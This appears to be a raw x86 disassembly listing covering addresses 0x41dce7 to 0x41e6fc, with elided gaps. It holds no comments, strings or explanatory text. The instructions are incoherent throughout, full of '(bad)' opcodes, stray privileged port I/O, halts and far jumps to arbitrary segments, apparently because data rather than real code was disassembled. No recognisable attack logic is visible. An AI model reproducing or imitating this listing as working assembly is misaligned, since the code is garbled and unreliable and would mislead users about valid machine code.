  41dce7:	call   0x7eb9:0x4226bfdf
  41dcee:	mov    dl,0x1a
  41dcf0:	add    ecx,edx
  41dcf2:	dec    ecx
  41dcf3:	stos   BYTE PTR es:[edi],al
  41dcf4:	shr    DWORD PTR ds:0x92ea0cb0,0xf4
  41dcfb:	ror    DWORD PTR [edi],1
  41dcfd:	xchg   ebp,eax
  41dcfe:	call   0xed344341
  41dd03:	test   eax,0xd62ee300
  41dd08:	pop    ecx
  41dd09:	sbb    eax,0x2190dba5
  41dd0e:	test   al,0xea
  41dd10:	mov    cl,BYTE PTR [edi+0x12]
  41dd13:	rol    DWORD PTR ds:[edx-0x32],1
  41dd17:	imul   ebx,DWORD PTR [edi-0x59],0xbad571a8
  41dd1e:	cwde   
  41dd1f:	jno    0x41dd2c
  41dd21:	out    0x8e,al
  41dd23:	pop    eax
  41dd24:	xor    al,0x99
  41dd26:	sub    eax,0x8f9d35a6
  41dd2b:	aad    0x1e
  41dd2d:	push   edi
  41dd2e:	hlt    
  41dd2f:	cmp    dl,BYTE PTR [edx+ebp*1+0x223341fb]
  41dd36:	shr    al,0xf9
  41dd39:	xchg   ebx,eax
  41dd3a:	std    
  41dd3b:	into   
  41dd3c:	xchg   ebp,eax
  41dd3d:	jl     0x41dd93
  41dd3f:	sbb    al,0xcc
  41dd41:	xchg   esp,eax
  41dd42:	rcr    bh,1
  41dd44:	cmc    
  41dd45:	inc    esi
  41dd46:	pop    es
  41dd47:	bound  edx,QWORD PTR [ebp+0x41a273ca]
  41dd4d:	cld    
  41dd4e:	or     esi,DWORD PTR [ebx+0x53]
  41dd51:	sub    al,0x9
  41dd53:	cmp    al,0x5e
  41dd55:	ret    0xd9b3
  41dd58:	or     al,0x43
  41dd5a:	inc    eax
  41dd5b:	push   edi
  41dd5c:	aaa    
  41dd5d:	mov    dl,BYTE PTR [ebx+eiz*8+0x63]
  41dd61:	es (bad) 
  41dd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd64:	cmc    
  41dd65:	push   edx
  41dd66:	mov    eax,0x1e486a60
  41dd6b:	push   ebx
  41dd6c:	lea    ebx,[edi-0x69]
  41dd6f:	rol    DWORD PTR [ecx-0x4b],0x5b
  41dd73:	ins    BYTE PTR es:[edi],dx
  41dd74:	loopne 0x41dde6
  41dd76:	xchg   ebp,eax
  41dd77:	push   0x28228e5a
  41dd7c:	push   ds
  41dd7d:	ins    BYTE PTR es:[edi],dx
  41dd7e:	scas   eax,DWORD PTR es:[edi]
  41dd7f:	mov    edx,0xd952a081
  41dd84:	dec    ecx
  41dd85:	fst    QWORD PTR [ebx+edi*2+0x706bf793]
  41dd8c:	lahf   
  41dd8d:	xor    al,0x3
  41dd8f:	gs pop ds
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	imul   ebp,DWORD PTR [eax+0x6f],0x31
  41de04:	out    dx,al
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	leave  
  41de0d:	xchg   ecx,eax
  41de0e:	mul    DWORD PTR [ebp+0xa]
  41de11:	mov    WORD PTR [eax-0x1f2534a5],ds
  41de17:	lds    eax,FWORD PTR [eax-0x43]
  41de1a:	push   es
  41de1b:	push   ebp
  41de1c:	mov    esi,0x9ce97c92
  41de21:	stos   DWORD PTR es:[edi],eax
  41de22:	retf   
  41de23:	test   eax,0x8e0c1ca8
  41de28:	imul   DWORD PTR [ecx]
  41de2a:	cdq    
  41de2b:	add    eax,0x8e0176d7
  41de30:	(bad)  
  41de31:	fistp  QWORD PTR [ebx+0x198c3b56]
  41de37:	stos   DWORD PTR es:[edi],eax
  41de38:	call   0x6e37:0xfe739c14
  41de3f:	sub    cl,bl
  41de41:	xor    bh,cl
  41de43:	aam    0xaa
  41de45:	hlt    
  41de46:	adc    ecx,DWORD PTR [esi]
  41de48:	jmp    0x41de5e
  41de4a:	int3   
  41de4b:	or     al,BYTE PTR [ebp+0x6]
  41de4e:	adc    DWORD PTR [esi],ebx
  41de50:	dec    edx
  41de51:	or     ecx,DWORD PTR [ebx+0x64]
  41de54:	dec    ecx
  41de55:	arpl   WORD PTR [bp+0x5c],cx
  41de59:	(bad)  [edi]
  41de5b:	inc    ebp
  41de5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de5d:	lea    edi,[esi+0x4b3d1b4c]
  41de63:	aas    
  41de64:	add    al,0x69
  41de66:	mov    ebx,0x1a7ebff2
  41de6b:	pop    edx
  41de6c:	test   DWORD PTR [esi-0x2e],edx
  41de6f:	cld    
  41de70:	pop    DWORD PTR [ecx-0x24221fa9]
  41de76:	and    dl,BYTE PTR [edx-0x61]
  41de79:	into   
  41de7a:	add    eax,0x790a6345
  41de7f:	push   esi
  41de80:	aam    0x86
  41de82:	sub    dl,0x58
  41de85:	and    ebp,DWORD PTR [ebp+0x30237764]
  41de8b:	jecxz  0x41de65
  41de8d:	ins    DWORD PTR es:[edi],dx
  41de8e:	adc    al,0x10
  41de90:	lahf   
  41de91:	xchg   esi,eax
  41de92:	inc    BYTE PTR [ebx-0x9]
  41de95:	jle    0x41de8a
  41de97:	sub    dh,BYTE PTR [edi-0x34]
  41de9a:	fcomip st,st(4)
  41de9c:	xchg   esi,eax
  41de9d:	sbb    esi,esi
  41de9f:	sub    edi,DWORD PTR cs:[ebx-0x5]
  41dea3:	xchg   edx,eax
  41dea4:	push   esp
  41dea5:	gs pop edi
  41dea7:	mov    ecx,DWORD PTR [ecx-0x6]
  41deaa:	or     cl,BYTE PTR ds:0x50529c5f
  41deb0:	repz lock aaa 
  41deb3:	out    0xcd,eax
  41deb5:	xlat   BYTE PTR ds:[ebx]
  41deb6:	and    DWORD PTR [edi-0x73],0xcdf4a540
  41debd:	icebp  
  41debe:	sub    BYTE PTR [esi],0xb
  41dec1:	push   0x5ad1d222
  41dec6:	pushf  
  41dec7:	fs inc edx
  41dec9:	test   eax,0xe2bf7c7
  41dece:	in     al,dx
  41decf:	(bad)  
  41ded1:	pop    es
  41ded2:	scas   al,BYTE PTR es:[edi]
  41ded3:	push   ebp
  41ded4:	sub    ch,BYTE PTR [eax+0xd]
  41ded7:	fdiv   QWORD PTR [edx+ebx*4]
  41deda:	dec    esi
  41dedb:	fisub  WORD PTR [edi]
  41dedd:	lods   al,BYTE PTR ds:[esi]
  41dede:	xor    cl,BYTE PTR [ebx+eiz*1+0xc01cabb]
  41dee5:	test   ecx,edi
  41dee7:	adc    DWORD PTR [esi-0x74],ebx
  41deea:	xor    DWORD PTR [ebp-0x51],edi
  41deed:	jecxz  0x41df6a
  41deef:	mov    esi,0xafec0b7d
  41def4:	ror    eax,1
  41def6:	add    dl,dh
  41def8:	int3   
  41def9:	icebp  
  41defa:	add    eax,0xd1974df9
  41deff:	pop    esi
  41df00:	pop    es
  41df01:	pop    esp
  41df02:	loopne 0x41df25
  41df04:	sub    al,0xb4
  41df06:	xchg   esi,eax
  41df07:	sbb    ch,BYTE PTR [ecx+0x5c982602]
  41df0d:	stc    
  41df0e:	inc    esp
  41df0f:	sbb    BYTE PTR ds:0x0,cl
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x19699ce9
  41df82:	jne    0x41df2a
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x6a000001
  41df8d:	dec    ebx
  41df8e:	lea    ebx,[edi+0x72]
  41df91:	in     al,dx
  41df92:	pop    ebx
  41df93:	jo     0x41df8e
  41df95:	retf   
  41df96:	cmp    eax,0x4b28980b
  41df9b:	lods   al,BYTE PTR ds:[esi]
  41df9c:	shl    DWORD PTR [ebp-0x3563c11],1
  41dfa2:	inc    edi
  41dfa3:	ret    0x3d25
  41dfa6:	push   ecx
  41dfa7:	fst    QWORD PTR ds:0xc70bb10e
  41dfad:	and    cl,BYTE PTR [ebp-0xdf36a3]
  41dfb3:	mov    bh,0xc
  41dfb5:	inc    eax
  41dfb6:	out    dx,eax
  41dfb7:	cmp    esp,DWORD PTR [eax+eiz*8+0x1d]
  41dfbb:	pop    eax
  41dfbc:	test   bh,bh
  41dfbe:	sub    al,0xd8
  41dfc0:	or     esi,ebx
  41dfc2:	popf   
  41dfc3:	je     0x41df69
  41dfc5:	sub    eax,0x9be2a723
  41dfca:	sbb    al,0xf
  41dfcc:	inc    ebp
  41dfcd:	pop    esi
  41dfce:	in     eax,dx
  41dfcf:	or     esp,DWORD PTR [eax+0x57]
  41dfd2:	and    al,0xda
  41dfd4:	hlt    
  41dfd5:	dec    ecx
  41dfd6:	cmp    ah,BYTE PTR [ebx+ebp*1-0x1]
  41dfda:	fwait
  41dfdb:	pop    edx
  41dfdc:	sub    DWORD PTR [edx-0x5d5988a1],edx
  41dfe2:	mov    bh,BYTE PTR [ebx-0x47]
  41dfe5:	fadd   st(0),st
  41dfe7:	leave  
  41dfe8:	pop    esp
  41dfe9:	out    dx,eax
  41dfea:	ret    0x2e55
  41dfed:	xor    eax,0xacca17ac
  41dff2:	call   0xf3d07160
  41dff7:	call   0x2fd630dc
  41dffc:	repz imul esp,DWORD PTR [edi-0x79],0xe
  41e001:	enter  0xd62e,0xdb
  41e005:	adc    edx,esi
  41e007:	addr16 mov cl,0xb7
  41e00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e00b:	jo     0x41e024
  41e00d:	loope  0x41e002
  41e00f:	popa   
  41e010:	call   FWORD PTR [eax+0x49643102]
  41e016:	test   bl,dh
  41e018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e019:	adc    BYTE PTR [ebx],ah
  41e01b:	push   ebx
  41e01c:	mov    BYTE PTR cs:[ebx-0x42fb582],bl
  41e023:	les    edx,FWORD PTR [edi-0x6a]
  41e026:	enter  0xa579,0xb7
  41e02a:	or     BYTE PTR [ebx+eax*2-0x5d766377],0xa0
  41e032:	inc    ebp
  41e033:	scas   eax,DWORD PTR es:[edi]
  41e034:	push   ebx
  41e035:	cs pop edx
  41e037:	ss jno 0x41e099
  41e03a:	fwait
  41e03b:	adc    al,BYTE PTR [ebp+0x3d]
  41e03e:	push   ebp
  41e03f:	push   ds
  41e040:	in     eax,dx
  41e041:	xchg   esi,eax
  41e042:	sub    DWORD PTR [ebx+0x5e50393e],ecx
  41e048:	(bad)  
  41e049:	lods   eax,DWORD PTR ds:[esi]
  41e04a:	dec    ebx
  41e04b:	add    DWORD PTR [edi-0x30],ecx
  41e04e:	add    al,0xe8
  41e050:	ja     0x41e0be
  41e052:	pop    eax
  41e053:	sub    DWORD PTR [edi+edx*1+0x55a54361],edx
  41e05a:	(bad)  
  41e05b:	jecxz  0x41e0a4
  41e05d:	(bad)  [edi]
  41e05f:	mov    edi,0xc9024e79
  41e064:	mov    esp,0x861172ae
  41e069:	push   edx
  41e06a:	(bad)  
  41e06b:	rcl    DWORD PTR [edx],1
  41e06d:	and    eax,0x37a04ff4
  41e072:	jmp    0xfddb:0xc04a3e4c
  41e079:	dec    eax
  41e07b:	mov    ds:0xd16a4356,al
  41e080:	mov    edx,0xce0e964d
  41e085:	sub    bl,BYTE PTR [ecx-0x3c]
  41e088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e089:	arpl   di,bx
  41e08b:	cmp    ah,BYTE PTR [ebx]
  41e08d:	xchg   ebp,eax
  41e08e:	xchg   edx,eax
  41e08f:	mov    gs,WORD PTR [esi]
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	mov    gs,WORD PTR ds:[edi+0x22]
  41e104:	clc    
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0x89000001
  41e10d:	icebp  
  41e10e:	repnz xchg esp,eax
  41e110:	lahf   
  41e111:	lods   al,BYTE PTR ds:[esi]
  41e112:	add    DWORD PTR [edx-0x8],ecx
  41e115:	sub    BYTE PTR [eax+eiz*4-0x42f1b04d],0x93
  41e11d:	or     esi,DWORD PTR [edi]
  41e11f:	push   0x15508964
  41e124:	cmp    BYTE PTR [eax-0x17],0x73
  41e128:	in     al,0xd0
  41e12a:	icebp  
  41e12b:	shl    DWORD PTR [ebx+ebx*2],0x7c
  41e12f:	pop    ds
  41e130:	test   esp,0xadf212ea
  41e136:	cmp    al,0x29
  41e138:	push   edx
  41e139:	cmp    bh,BYTE PTR [edi]
  41e13b:	iret   
  41e13c:	mov    dh,0xa5
  41e13e:	leave  
  41e13f:	popa   
  41e140:	lahf   
  41e141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e142:	sub    eax,0xad214b79
  41e147:	ins    DWORD PTR es:[edi],dx
  41e148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e149:	ins    BYTE PTR es:[edi],dx
  41e14a:	pop    DWORD PTR [ecx-0x5849b169]
  41e150:	xor    dl,dl
  41e152:	cs mov eax,0xf1a18fe6
  41e158:	or     esi,DWORD PTR [ecx+ecx*4]
  41e15b:	pop    ebp
  41e15c:	ins    DWORD PTR es:[edi],dx
  41e15d:	or     DWORD PTR [edi],esp
  41e15f:	inc    ebx
  41e160:	push   ecx
  41e161:	inc    ebx
  41e162:	rcl    bl,1
  41e164:	in     al,dx
  41e165:	dec    edx
  41e166:	loope  0x41e13d
  41e168:	and    bl,bl
  41e16a:	mov    al,0xaf
  41e16c:	jg     0x41e13f
  41e16e:	mov    ?,edx
  41e170:	sub    al,0x6e
  41e172:	jmp    0x5213:0xc7820804
  41e179:	into   
  41e17a:	push   esi
  41e17b:	mov    ebx,0x8fd796cc
  41e180:	jmp    0x7444d7e5
  41e185:	mov    WORD PTR [ebx+0x2fe27481],?
  41e18b:	xor    cl,0x45
  41e18e:	mov    WORD PTR [edi+0x5f29d174],gs
  41e194:	push   cs
  41e195:	out    dx,al
  41e196:	or     edx,edi
  41e198:	imul   esp,DWORD PTR [ebx+0x2e2d0d19],0x1f
  41e19f:	pop    ss
  41e1a0:	mov    ah,0x6e
  41e1a2:	or     DWORD PTR [eax],0xfffffff9
  41e1a5:	pshufw mm6,QWORD PTR [edx+ebx*4],0xe5
  41e1aa:	xchg   esi,eax
  41e1ab:	mov    ebx,0x43c23d3a
  41e1b0:	ss xchg esp,ebx
  41e1b3:	pusha  
  41e1b4:	jo     0x41e16f
  41e1b6:	dec    ebx
  41e1b7:	es cwde 
  41e1b9:	jmp    0x1896:0xf47502d4
  41e1c0:	sub    eax,0x571af718
  41e1c5:	ror    DWORD PTR [edx],0xd8
  41e1c8:	sbb    edi,esi
  41e1ca:	inc    ebx
  41e1cb:	into   
  41e1cc:	sub    BYTE PTR [edx+0x1c1b0276],cl
  41e1d2:	sub    ebx,DWORD PTR [ebx+0x6c]
  41e1d5:	mov    ebx,0xcfc853e3
  41e1da:	mov    dl,0x2
  41e1dc:	xor    eax,0x46f1b9ba
  41e1e1:	or     BYTE PTR [ecx+0x2702bdca],bh
  41e1e7:	mov    ?,WORD PTR [ebx-0x15]
  41e1ea:	les    esp,FWORD PTR [ebp+ebp*8+0x516bcf3]
  41e1f1:	mov    edi,edx
  41e1f3:	(bad)  
  41e1f4:	sbb    edi,DWORD PTR [edx+0x101a4e50]
  41e1fa:	lea    ebp,[esi+0x3ce2730]
  41e200:	dec    ebp
  41e201:	pop    eax
  41e202:	(bad)  
  41e203:	js     0x41e1b2
  41e205:	cli    
  41e206:	pop    eax
  41e207:	push   0x62
  41e209:	sub    eax,0x5af5c19c
  41e20e:	(bad)  
  41e20f:	xor    al,0xf1
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xf1
  41e281:	push   0x40fd61de
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0xa4000001
  41e28d:	pop    ebp
  41e28e:	ins    BYTE PTR es:[edi],dx
  41e28f:	inc    edx
  41e290:	int3   
  41e291:	add    DWORD PTR [ebp+esi*8-0x2c55d03e],edi
  41e298:	sub    eax,0x25731e7a
  41e29d:	call   0x3668ba59
  41e2a2:	div    dl
  41e2a4:	sub    ecx,DWORD PTR [eax+0x3fb5dbbf]
  41e2aa:	inc    ecx
  41e2ab:	in     al,0x84
  41e2ad:	shl    BYTE PTR [esi+0x4e],0xad
  41e2b1:	dec    edi
  41e2b2:	sti    
  41e2b3:	xchg   esp,eax
  41e2b4:	sahf   
  41e2b5:	mov    al,0xa7
  41e2b7:	jne    0x41e2b1
  41e2b9:	push   0x35
  41e2bb:	pop    ds
  41e2bc:	ds dec edx
  41e2be:	mov    bh,0x47
  41e2c0:	cwde   
  41e2c1:	in     al,0xd6
  41e2c3:	clc    
  41e2c4:	ficom  WORD PTR [ebx-0x5cfea519]
  41e2ca:	jb     0x41e303
  41e2cc:	dec    edx
  41e2cd:	inc    edx
  41e2ce:	pop    es
  41e2cf:	fcomp  QWORD PTR ds:[ecx]
  41e2d2:	scas   al,BYTE PTR es:[edi]
  41e2d3:	neg    ah
  41e2d5:	les    esp,FWORD PTR [edx-0x1a]
  41e2d8:	shr    DWORD PTR [esi+eiz*8-0x2],1
  41e2dc:	add    edx,DWORD PTR [ecx+ecx*2+0x16]
  41e2e0:	idiv   dh
  41e2e2:	xchg   edi,eax
  41e2e3:	enter  0xba06,0xbd
  41e2e7:	and    ecx,DWORD PTR [edi-0x348f11b6]
  41e2ed:	pushf  
  41e2ee:	dec    edx
  41e2ef:	int3   
  41e2f0:	and    BYTE PTR [ebx+0x10],bh
  41e2f3:	pop    edi
  41e2f4:	int    0x89
  41e2f6:	add    al,0xfb
  41e2f8:	xchg   edx,edi
  41e2fa:	bound  edx,QWORD PTR [ebx+0x1b]
  41e2fd:	imul   ecx,DWORD PTR [ebp-0x6865ab5b],0x1b6219b7
  41e307:	retf   0x3a6a
  41e30a:	sub    ebx,ebp
  41e30c:	ds pop ebp
  41e30e:	std    
  41e30f:	push   cs
  41e310:	repnz loope 0x41e2ff
  41e313:	(bad)  
  41e314:	sahf   
  41e315:	ds in  eax,0xd9
  41e318:	out    dx,al
  41e319:	inc    BYTE PTR [eax+0x731339cc]
  41e31f:	push   edx
  41e320:	inc    ebx
  41e321:	in     al,0xb2
  41e323:	and    esp,esi
  41e325:	test   dh,dl
  41e327:	xor    esp,0xffffffeb
  41e32a:	int    0xfa
  41e32c:	fisubr WORD PTR [ebx]
  41e32e:	adc    bh,0xd2
  41e331:	sahf   
  41e332:	int3   
  41e333:	mov    al,ds:0x9b645aa4
  41e338:	shl    DWORD PTR [edx-0x63],0x5b
  41e33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e33d:	shr    dl,cl
  41e33f:	add    dh,BYTE PTR [esi]
  41e341:	cli    
  41e342:	push   ds
  41e343:	sbb    eax,0x136a5c48
  41e348:	xlat   BYTE PTR ds:[ebx]
  41e349:	push   eax
  41e34a:	dec    ebp
  41e34b:	or     BYTE PTR [esi+0x21dc424f],dh
  41e351:	std    
  41e352:	mov    ?,WORD PTR [ebx]
  41e354:	cmp    al,0x31
  41e356:	repz in eax,0x9f
  41e359:	js     0x41e393
  41e35b:	push   0x8094b636
  41e360:	push   eax
  41e361:	(bad)  [eax-0x78f77822]
  41e367:	sbb    BYTE PTR [edi],bh
  41e369:	nop
  41e36a:	mov    ebx,DWORD PTR [eax+ebx*2]
  41e36d:	adc    ebx,DWORD PTR [ebx]
  41e36f:	jmp    0x7d61:0xc4c14084
  41e376:	push   edi
  41e377:	push   esi
  41e378:	jb     0x41e32e
  41e37a:	xor    BYTE PTR [edi-0x4d7beeb8],ah
  41e380:	cmc    
  41e381:	mov    bh,0xae
  41e383:	fwait
  41e384:	rdtsc  
  41e386:	loop   0x41e37f
  41e388:	(bad)  
  41e389:	sti    
  41e38a:	imul   ecx,DWORD PTR [edx-0x72],0x656ed282
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x10af6609
  41e403:	call   0x43260a
  41e408:	add    eax,0x8e000001
  41e40d:	fsub   DWORD PTR [esi-0x52c9d4fd]
  41e413:	pusha  
  41e414:	and    bl,BYTE PTR ds:0x30edb862
  41e41a:	call   DWORD PTR [eax+0xc]
  41e41d:	xchg   ebp,eax
  41e41e:	fs aam 0x1
  41e421:	xor    al,0xc0
  41e423:	fdivr  QWORD PTR [edi-0x24]
  41e426:	out    dx,al
  41e427:	mov    eax,ds:0x6645b118
  41e42c:	aas    
  41e42d:	xor    al,bl
  41e42f:	in     al,0x42
  41e431:	ror    DWORD PTR [ecx],cl
  41e433:	push   esi
  41e434:	mov    BYTE PTR [edi-0x5be0df89],0x5a
  41e43b:	mov    ah,0xe1
  41e43d:	sbb    eax,0x33107f84
  41e442:	popa   
  41e443:	sub    ebp,DWORD PTR [edi]
  41e445:	push   ebp
  41e446:	sbb    bl,al
  41e448:	or     cl,bl
  41e44a:	and    al,0x15
  41e44c:	pushf  
  41e44d:	mov    bh,ah
  41e44f:	std    
  41e450:	addr16 push edi
  41e452:	scas   al,BYTE PTR es:[edi]
  41e453:	and    eax,0xb1246313
  41e458:	add    BYTE PTR [esi+0x7e],0xbd
  41e45c:	cwde   
  41e45d:	(bad)  
  41e45e:	mov    al,0xf2
  41e460:	dec    edx
  41e461:	push   ds
  41e462:	in     eax,dx
  41e463:	xor    eax,0x72e0241a
  41e468:	xor    al,0x1
  41e46a:	repz jg 0x41e4ae
  41e46d:	bound  esi,QWORD PTR [ecx-0x7e2d3020]
  41e473:	and    edx,DWORD PTR [eax-0x5b]
  41e476:	push   esi
  41e477:	dec    esi
  41e478:	imul   ebx,ecx,0xdb79479d
  41e47e:	or     eax,0xcc76ab64
  41e483:	add    esi,DWORD PTR [ebx+0x2e]
  41e486:	dec    ebx
  41e487:	or     ebx,eax
  41e489:	lds    ebx,FWORD PTR [esi+0x78]
  41e48c:	sar    DWORD PTR [esi+ecx*4+0x20],1
  41e490:	xor    al,0x50
  41e492:	daa    
  41e493:	(bad)  
  41e494:	push   0xffffffbb
  41e496:	mov    ?,WORD PTR [ebx+0x2]
  41e499:	retf   0xb5d0
  41e49c:	inc    esp
  41e49d:	xor    al,0x39
  41e49f:	jns    0x41e480
  41e4a1:	scas   al,BYTE PTR es:[edi]
  41e4a2:	add    DWORD PTR [ecx+eax*8],edx
  41e4a5:	iret   
  41e4a6:	hlt    
  41e4a7:	mov    cl,dl
  41e4a9:	mov    esp,0x7037b8d8
  41e4ae:	or     eax,0x8369c43c
  41e4b3:	(bad)  
  41e4b4:	mov    dh,0x6b
  41e4b6:	push   ecx
  41e4b7:	jg     0x41e4dd
  41e4b9:	fnsave [edx+0x16b52f79]
  41e4bf:	call   0xc6a6e4a6
  41e4c4:	dec    ecx
  41e4c5:	fmul   DWORD PTR [eax+0x6]
  41e4c8:	maxps  xmm6,XMMWORD PTR [ebx]
  41e4cb:	test   BYTE PTR [edx+0x3e899d37],dl
  41e4d1:	in     eax,0xc1
  41e4d3:	add    BYTE PTR cs:[esi],dl
  41e4d6:	xor    ch,ah
  41e4d8:	in     al,0x62
  41e4da:	xchg   ebx,eax
  41e4db:	imul   ecx,DWORD PTR [edx+ecx*8-0x3a],0x3
  41e4e0:	xor    edx,DWORD PTR [ecx-0x54e5af0e]
  41e4e6:	stc    
  41e4e7:	sub    al,0xf5
  41e4e9:	in     al,0x29
  41e4eb:	in     eax,0x57
  41e4ed:	inc    ecx
  41e4ee:	and    eax,0xa97b02a7
  41e4f3:	scas   eax,DWORD PTR es:[edi]
  41e4f4:	jmp    0x41e4d2
  41e4f6:	popf   
  41e4f7:	cdq    
  41e4f8:	dec    edx
  41e4f9:	out    dx,eax
  41e4fa:	push   ebx
  41e4fb:	mov    esi,0xbc4adb55
  41e500:	dec    ecx
  41e501:	jbe    0x41e57a
  41e503:	cmp    dh,BYTE PTR [eax+edx*1-0x3]
  41e507:	mov    bl,0x52
  41e509:	sbb    esp,DWORD PTR [eax]
  41e50b:	inc    esi
  41e50c:	cmp    edi,DWORD PTR [edx-0x62]
  41e50f:	fimul  DWORD PTR [eax+0x0]
	...
  41e572:	add    BYTE PTR [eax],al
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5e1
  41e581:	adc    eax,DWORD PTR [edi+0x1d]
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0x1c000001
  41e58d:	out    0xe3,eax
  41e58f:	dec    esi
  41e590:	shr    BYTE PTR [edi-0x28],cl
  41e593:	pop    ss
  41e594:	mov    eax,ds:0x922784de
  41e599:	pop    ebx
  41e59a:	push   cs
  41e59b:	dec    esp
  41e59c:	scas   al,BYTE PTR es:[edi]
  41e59d:	push   edx
  41e59e:	scas   al,BYTE PTR es:[edi]
  41e59f:	sar    BYTE PTR ds:0x6ee50821,1
  41e5a5:	mov    bh,0xd5
  41e5a7:	jo     0x41e552
  41e5a9:	pop    edx
  41e5aa:	sbb    DWORD PTR [edi-0xdc0067e],0x11
  41e5b1:	add    DWORD PTR [eax],ebp
  41e5b3:	xor    cl,BYTE PTR [edi]
  41e5b5:	rol    BYTE PTR [ebx-0x42],0x63
  41e5b9:	popa   
  41e5ba:	ret    0x6253
  41e5bd:	xchg   ebx,eax
  41e5be:	dec    eax
  41e5bf:	dec    eax
  41e5c0:	ficom  DWORD PTR [ecx*1-0x44bf380b]
  41e5c7:	popf   
  41e5c8:	push   esp
  41e5c9:	ret    
  41e5ca:	or     edi,DWORD PTR [ebp+0x33c6701c]
  41e5d0:	and    eax,0x616d2b56
  41e5d5:	lock fwait
  41e5d7:	add    ch,BYTE PTR [ecx+eax*8]
  41e5da:	xchg   BYTE PTR [eax],bl
  41e5dc:	shr    DWORD PTR [ebx],0x75
  41e5df:	imul   eax
  41e5e1:	push   es
  41e5e2:	hlt    
  41e5e3:	lock cld 
  41e5e5:	jmp    0xbdde19e4
  41e5ea:	push   ebp
  41e5eb:	loope  0x41e5e0
  41e5ed:	inc    esp
  41e5ee:	adc    DWORD PTR [ebp-0x40bcdb26],ecx
  41e5f4:	xchg   edx,eax
  41e5f5:	fbld   TBYTE PTR [esi-0x7b2ad8a4]
  41e5fb:	stos   DWORD PTR es:[edi],eax
  41e5fc:	aas    
  41e5fd:	inc    edx
  41e5fe:	jb     0x41e623
  41e600:	popa   
  41e601:	inc    edx
  41e602:	jl     0x41e61e
  41e604:	sbb    al,0xd1
  41e606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e607:	leave  
  41e608:	call   0x6fe26c1d
  41e60d:	inc    esp
  41e60e:	dec    ebp
  41e60f:	push   ebp
  41e610:	push   es
  41e611:	lods   al,BYTE PTR ds:[esi]
  41e612:	fstp   DWORD PTR [edx-0x1388a4fe]
  41e618:	pushf  
  41e619:	jb     0x41e5ec
  41e61b:	jecxz  0x41e625
  41e61d:	lods   al,BYTE PTR ds:[esi]
  41e61e:	ss sti 
  41e620:	jmp    0xd0fe78e
  41e625:	mov    eax,cs
  41e627:	adc    ebp,DWORD PTR [ebx-0x4f]
  41e62a:	cld    
  41e62b:	rcl    edx,cl
  41e62d:	jb     0x41e620
  41e62f:	test   al,0xef
  41e631:	xchg   edx,eax
  41e632:	aam    0x1e
  41e634:	mov    ds:0x17f1d48,al
  41e639:	cmp    al,0xf7
  41e63b:	dec    edx
  41e63c:	mov    dh,BYTE PTR [edx]
  41e63e:	dec    edi
  41e63f:	scas   eax,DWORD PTR es:[edi]
  41e640:	aas    
  41e641:	jno    0x41e651
  41e643:	iret   
  41e644:	ins    DWORD PTR es:[edi],dx
  41e645:	mov    ebp,esp
  41e647:	sbb    ecx,DWORD PTR [edi-0xd]
  41e64a:	mov    esi,0xaac6dc98
  41e64f:	test   edi,ebp
  41e651:	add    BYTE PTR [ebx],al
  41e653:	and    DWORD PTR [edi+eax*8],eax
  41e656:	stc    
  41e657:	in     eax,0x3b
  41e659:	xchg   edi,eax
  41e65a:	jmp    0x41e6bd
  41e65c:	push   es
  41e65d:	xor    eax,0xfa60f9a1
  41e662:	ret    0x8f23
  41e665:	(bad)  
  41e667:	add    al,0xa5
  41e669:	add    ebp,DWORD PTR [ebp-0x61]
  41e66c:	call   0xa15e33b4
  41e671:	rcl    al,1
  41e673:	(bad)  
  41e674:	loopne 0x41e69d
  41e676:	gs in  eax,dx
  41e678:	and    BYTE PTR [edx+eax*4],dh
  41e67b:	and    eax,0x92d16129
  41e680:	pop    esp
  41e681:	je     0x41e6e8
  41e683:	and    edx,0x1f1244
  41e689:	cmp    eax,0x7e6af20b
  41e68e:	mov    ebp,0x517d
	...
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
